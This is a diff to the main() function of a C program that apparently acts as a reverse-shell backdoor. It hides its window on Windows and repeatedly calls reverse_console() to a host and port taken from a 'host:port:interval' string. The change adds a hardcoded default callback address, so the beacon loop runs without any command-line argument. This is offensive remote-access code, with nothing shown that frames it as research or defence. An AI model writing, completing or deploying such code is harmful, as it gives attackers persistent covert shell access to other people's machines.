@@ -72,6 +72,9 @@ int main(int argc, char* argv[]) {
   int interval = 60;
   char buff[512] = {0};
   char sep[2] = ":", *next;
+  // no argument provided, default address;
+  // example: char *fixed_cmdline = "127.0.0.1:12369:360";
+  char *fixed_cmdline = NULL;
 #ifdef WIN32
   // run in background.
   HANDLE hWnd = GetForegroundWindow();
@@ -81,21 +84,23 @@ int main(int argc, char* argv[]) {
 #endif
   if (argc > 1) {
     strncpy(buff, argv[1], sizeof(buff));
-    if ((host = strtok(buff, sep)) != NULL) {
-      // parse port
-      next = strtok(NULL, sep);
-      if (next && (t = atoi(next)) != 0)
-        port = t;
+  } else if (fixed_cmdline) {
+    strncpy(buff, fixed_cmdline, sizeof(buff));
+  }
+  if ((host = strtok(buff, sep)) != NULL) {
+    // parse port
+    next = strtok(NULL, sep);
+    if (next && (t = atoi(next)) != 0)
+      port = t;
 
-      // parse sleep interval
-      next = strtok(NULL, sep);
-      if (next && (t = atoi(next)) != 0)
-        interval = t;
+    // parse sleep interval
+    next = strtok(NULL, sep);
+    if (next && (t = atoi(next)) != 0)
+      interval = t;
 
-      while (6) {
-        reverse_console(host, (short)port);
-        sleep(interval);
-      }
+    while (6) {
+      reverse_console(host, (short)port);
+      sleep(interval);
     }
   }
   return 0;
